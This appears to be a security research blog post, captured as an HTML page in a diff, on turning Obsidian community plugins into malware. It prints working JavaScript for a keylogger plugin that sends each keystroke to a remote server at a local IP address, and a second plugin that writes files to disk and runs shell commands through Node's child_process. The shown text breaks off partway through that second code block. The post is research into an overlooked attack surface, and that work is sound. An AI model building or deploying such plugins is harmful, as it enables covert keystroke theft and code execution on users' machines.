@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Obsidian. An unconventional attack surface :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Introduction This research was inspired by Katie Inns and Jake Knotts research around unconventional attack surfaces. Link here
+I don&amp;rsquo;t quite remember how I came up with the idea of targeting obsidian plugins for malicious purposes, however, I do remember noticing that to install obsidian community plugins you have to disable &amp;ldquo;safe mode&amp;rdquo; which got me thinking on what are the potential consequences of a malicious plugin. Following this I did some research on what a plugin actually is and how I could make one." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/research/obsidian-malicious-plugins/obsidian-research/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Obsidian. An unconventional attack surface :: Research blog">
+<meta property="og:description" content="Using Obsidian plugins to keylog users, drop files to disk, or execute arbitrary code." />
+<meta property="og:url" content="https://thomas-byrne.co.uk/research/obsidian-malicious-plugins/obsidian-research/" />
+<meta property="og:site_name" content="Obsidian. An unconventional attack surface" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-09-16 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/research/obsidian-malicious-plugins/obsidian-research/">Obsidian. An unconventional attack surface</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-09-16 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk" class="post-cover" alt="Obsidian. An unconventional attack surface" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This research was inspired by Katie Inns and Jake Knotts research around unconventional attack surfaces. <a href="https://www.youtube.com/watch?v=QYhl_RcqZqI">Link here</a></p>
+<p>I don&rsquo;t quite remember how I came up with the idea of targeting obsidian plugins for malicious purposes, however, I do remember noticing that to install obsidian community plugins you have to disable &ldquo;safe mode&rdquo; which got me thinking on what are the potential consequences of a malicious plugin. Following this I did some research on what a plugin actually is and how I could make one.</p>
+<p>While the idea of utilising these plugins for nefarious use is probably not an original one (considering you have to disable &ldquo;safe mode&rdquo; inside Obsidian to implement community generated plugins) I am yet to see some research around these or any evidence of them being used in the wild for fun and profit.</p>
+<p>Essentially the initial idea was to attempt to leak some potentially sensitive information from a user to be used against an organisation.</p>
+<p>The purpose of this research is not to uncover a new vulnerability in obsidian, it is uncovering new ways, seemly harmless and potentially overlooked applications (or features of) can be used maliciously by threat actors, to compromise a system, exfiltrate data or used as persistence mechanisms. This research can be classified as abuse of feature, a lot like macros in office documents.</p>
+<h1 id="obsidian">Obsidian<a href="#obsidian" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>So what exactly is Obsidian? Obsidian is just a markdown renderer. There are many different types of mark down editors out there such as Noteable, gitbook, Jupyter etc all with varying functionality and use cases.</p>
+<p>To understand what these applications are under the hood we need to understand what markdown is. Markdown is a markup language, it is a shorthand syntax for html. It allows users to write notes quickly while being nicely formatted.</p>
+<p>So if you&rsquo;re currently thinking these note taking applications must have to deal with html/ css somewhere to carry out this formatting, you would be right. Essentially these applications are built around some sort of chromium engine which essentially means they&rsquo;re like mini web browsers, which must mean it is possible to execute JavaScript somewhere.</p>
+<h1 id="plugins">Plugins<a href="#plugins" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>So lets start by defining what a plugin is in obsidian and how we can go about making one.</p>
+<p>Essentially all they are is a folder with a <code>main.js</code> file, and a css stylesheet. There are some other files that aren&rsquo;t as interesting that are used to define version information and titles etc. We will skip over those for now. Therefore all a plugin is, is some JavaScript that executes within the context of the application.</p>
+<h1 id="building-the-malicious-plugin">Building the Malicious plugin<a href="#building-the-malicious-plugin" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Since a plugin is just JavaScript, I decided to generate my own to see what the capabilities of these plugins were and what access to the underlying file system they provide.</p>
+<p>To start with I implemented a basic key logger which would monitor the key strokes of the user in any markdown file and send it to a remote server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#e6db74">&#39;use strict&#39;</span>;
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obsidian</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;obsidian&#39;</span>);
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">extendStatics</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) {
+    <span style="color:#a6e22e">extendStatics</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">setPrototypeOf</span> <span style="color:#f92672">||</span>
+        ({ <span style="color:#a6e22e">__proto__</span><span style="color:#f92672">:</span> [] } <span style="color:#66d9ef">instanceof</span> Array <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) { <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">__proto__</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>; }) <span style="color:#f92672">||</span>
+        <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) { <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">p</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">b</span>) <span style="color:#66d9ef">if</span> (Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">hasOwnProperty</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">b</span>, <span style="color:#a6e22e">p</span>)) <span style="color:#a6e22e">d</span>[<span style="color:#a6e22e">p</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">p</span>]; };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">extendStatics</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>);
+};
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) {
+    <span style="color:#a6e22e">extendStatics</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__</span>() { <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">constructor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span>; }
+    <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> Object.<span style="color:#a6e22e">create</span>(<span style="color:#a6e22e">b</span>) <span style="color:#f92672">:</span> (<span style="color:#a6e22e">__</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">prototype</span>, <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">__</span>());
+}
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">MyPlugin</span> <span style="color:#f92672">=</span> <span style="color:#75715e">/** @class */</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_super</span>) {
+    <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">MyPlugin</span>, <span style="color:#a6e22e">_super</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">MyPlugin</span>() {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_super</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_super</span>.<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">arguments</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>;
+    }
+    <span style="color:#a6e22e">MyPlugin</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onInit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+    };
+    <span style="color:#a6e22e">MyPlugin</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_this</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;loading plugin&#39;</span>);
+        
+        document.<span style="color:#a6e22e">onkeypress</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">k</span>){ 
+            <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.0.115:8000/?key=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">escape</span>(<span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">key</span>)
+        } <span style="color:#f92672">&lt;------------------------</span> <span style="color:#a6e22e">keylogger</span>
+        
+        
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addRibbonIcon</span>(<span style="color:#e6db74">&#39;dice&#39;</span>, <span style="color:#e6db74">&#39;Sample Plugin&#39;</span>, <span style="color:#66d9ef">function</span> () {
+            <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Notice</span>(<span style="color:#e6db74">&#39;This is a notice!&#39;</span>);
+        });
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addStatusBarItem</span>().<span style="color:#a6e22e">setText</span>(<span style="color:#e6db74">&#39;Status Bar Text&#39;</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addCommand</span>({
+            <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;open-sample-modal&#39;</span>,
+            <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Open Sample Modal&#39;</span>,
+            <span style="color:#75715e">// callback: () =&gt; {
+</span><span style="color:#75715e"></span>            <span style="color:#75715e">// 	console.log(&#39;Simple Callback&#39;);
+</span><span style="color:#75715e"></span>            <span style="color:#75715e">// },
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">checkCallback</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">checking</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">leaf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_this</span>.<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">workspace</span>.<span style="color:#a6e22e">activeLeaf</span>;
+                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">leaf</span>) {
+                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">checking</span>) {
+                        <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SampleModal</span>(<span style="color:#a6e22e">_this</span>.<span style="color:#a6e22e">app</span>).<span style="color:#a6e22e">open</span>();
+                    }
+                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+                }
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+            }
+        });
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addSettingTab</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SampleSettingTab</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">app</span>, <span style="color:#66d9ef">this</span>));
+    };
+    <span style="color:#a6e22e">MyPlugin</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onunload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;unloading plugin&#39;</span>);
+    };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">MyPlugin</span>;
+}(<span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Plugin</span>));
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">SampleModal</span> <span style="color:#f92672">=</span> <span style="color:#75715e">/** @class */</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_super</span>) {
+    <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">SampleModal</span>, <span style="color:#a6e22e">_super</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">SampleModal</span>(<span style="color:#a6e22e">app</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_super</span>.<span style="color:#a6e22e">call</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">app</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>;
+    }
+    <span style="color:#a6e22e">SampleModal</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onOpen</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">contentEl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">contentEl</span>;
+        <span style="color:#a6e22e">contentEl</span>.<span style="color:#a6e22e">setText</span>(<span style="color:#e6db74">&#39;Woah!&#39;</span>);
+    };
+    <span style="color:#a6e22e">SampleModal</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onClose</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">contentEl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">contentEl</span>;
+        <span style="color:#a6e22e">contentEl</span>.<span style="color:#a6e22e">empty</span>();
+    };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SampleModal</span>;
+}(<span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Modal</span>));
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">SampleSettingTab</span> <span style="color:#f92672">=</span> <span style="color:#75715e">/** @class */</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_super</span>) {
+    <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">SampleSettingTab</span>, <span style="color:#a6e22e">_super</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">SampleSettingTab</span>() {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_super</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_super</span>.<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">arguments</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>;
+    }
+    <span style="color:#a6e22e">SampleSettingTab</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">containerEl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">containerEl</span>;
+        <span style="color:#a6e22e">containerEl</span>.<span style="color:#a6e22e">empty</span>();
+        <span style="color:#a6e22e">containerEl</span>.<span style="color:#a6e22e">createEl</span>(<span style="color:#e6db74">&#39;h2&#39;</span>, { <span style="color:#a6e22e">text</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Settings for my awesome plugin.&#39;</span> });
+        <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Setting</span>(<span style="color:#a6e22e">containerEl</span>)
+            .<span style="color:#a6e22e">setName</span>(<span style="color:#e6db74">&#39;Setting #1&#39;</span>)
+            .<span style="color:#a6e22e">setDesc</span>(<span style="color:#e6db74">&#39;It\&#39;s a secret&#39;</span>)
+            .<span style="color:#a6e22e">addText</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">text</span>) { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">text</span>.<span style="color:#a6e22e">setPlaceholder</span>(<span style="color:#e6db74">&#39;Enter your secret&#39;</span>)
+            .<span style="color:#a6e22e">setValue</span>(<span style="color:#e6db74">&#39;&#39;</span>)
+            .<span style="color:#a6e22e">onChange</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">value</span>) {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Secret: &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">value</span>);
+        }); });
+    };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SampleSettingTab</span>;
+}(<span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">PluginSettingTab</span>));
+
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">MyPlugin</span>;
+
+</code></pre></div><p><img src="/images/keylogger-obsidin.png" alt="keylogger"></p>
+<p>This worked perfectly and got me excited for what else could be done.</p>
+<p>Initially I thought we might not be able to access the underlying file system or drop a file to disk (like in a normal JScript payload) because this was just JavaScript that executes within the context of a browser like in a normal web application or in an XSS payload, therefore we would be sand-boxed within the obsidian application. However, after a couple google searches later I discovered obsidian plugins utilise node js, allowing node functionality to be invoked within the plugin.</p>
+<p>Discovering this I was able to create a payload to write a file to disk. This got me excited and a bit more research allowed me to use node to gain arbitrary code execution on the victim as can be seen below.</p>
+<p><img src="/images/obsidian-writetodisk.png" alt="filewrite"></p>
+<p><img src="/images/obsidiancalc.png" alt="calc"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obsidian</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;obsidian&#39;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);  <span style="color:#75715e">//&lt;---------- import node js
+</span><span style="color:#75715e"></span>
+
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">extendStatics</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) {
+    <span style="color:#a6e22e">extendStatics</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">setPrototypeOf</span> <span style="color:#f92672">||</span>
+        ({ <span style="color:#a6e22e">__proto__</span><span style="color:#f92672">:</span> [] } <span style="color:#66d9ef">instanceof</span> Array <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) { <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">__proto__</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>; }) <span style="color:#f92672">||</span>
+        <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) { <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">p</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">b</span>) <span style="color:#66d9ef">if</span> (Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">hasOwnProperty</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">b</span>, <span style="color:#a6e22e">p</span>)) <span style="color:#a6e22e">d</span>[<span style="color:#a6e22e">p</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">p</span>]; };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">extendStatics</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>);
+};
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) {
+    <span style="color:#a6e22e">extendStatics</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__</span>() { <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">constructor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span>; }
+    <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> Object.<span style="color:#a6e22e">create</span>(<span style="color:#a6e22e">b</span>) <span style="color:#f92672">:</span> (<span style="color:#a6e22e">__</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">prototype</span>, <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">__</span>());
+}
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">MyPlugin</span> <span style="color:#f92672">=</span> <span style="color:#75715e">/** @class */</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_super</span>) {
+    <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">MyPlugin</span>, <span style="color:#a6e22e">_super</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">MyPlugin</span>() {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_super</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_super</span>.<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">arguments</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>;
+    }
+    <span style="color:#a6e22e">MyPlugin</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onInit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+    };
+    <span style="color:#a6e22e">MyPlugin</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_this</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;loading!!!!!!!!!!!! plugin&#39;</span>);
+        
+
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Some content!&#39;</span>;
+        <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFile</span>(<span style="color:#e6db74">&#39;C:\\Users\\Dev1\\Documents\\PluginTesting\\.obsidian\\plugins\\obsidian-sample-plugin-1.0.0\\test.txt&#39;</span>, <span style="color:#a6e22e">content</span>, <span style="color:#a6e22e">err</span> =&gt; {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">err</span>);
+        }
+        <span style="color:#75715e">// file written successfully
+</span><span style="color:#75715e"></span>        });
+        <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">exec</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>);
+        
+        <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;dir&#34;</span>, (<span style="color:#a6e22e">error</span>, <span style="color:#a6e22e">stdout</span>, <span style="color:#a6e22e">stderr</span>) =&gt; {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">error</span>) {
+                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`error: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">message</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+                <span style="color:#66d9ef">return</span>;
+            }
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stderr</span>) {
+                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`stderr: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">stderr</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+                <span style="color:#66d9ef">return</span>;
+            }
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`stdout: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">stdout</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+        });
+
+    
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addRibbonIcon</span>(<span style="color:#e6db74">&#39;dice&#39;</span>, <span style="color:#e6db74">&#39;Sample Plugin&#39;</span>, <span style="color:#66d9ef">function</span> () {
+            <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Notice</span>(<span style="color:#e6db74">&#39;This is a notice!&#39;</span>);
+        });
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addStatusBarItem</span>().<span style="color:#a6e22e">setText</span>(<span style="color:#e6db74">&#39;Status Bar Text&#39;</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addCommand</span>({
+            <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;open-sample-modal&#39;</span>,
+            <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Open Sample Modal&#39;</span>,
+            <span style="color:#75715e">// callback: () =&gt; {
+</span><span style="color:#75715e"></span>            <span style="color:#75715e">// 	console.log(&#39;Simple Callback&#39;);
+</span><span style="color:#75715e"></span>            <span style="color:#75715e">// },
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">checkCallback</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">checking</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">leaf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_this</span>.<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">workspace</span>.<span style="color:#a6e22e">activeLeaf</span>;
+                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">leaf</span>) {
+                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">checking</span>) {
+                        <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SampleModal</span>(<span style="color:#a6e22e">_this</span>.<span style="color:#a6e22e">app</span>).<span style="color:#a6e22e">open</span>();
+                    }
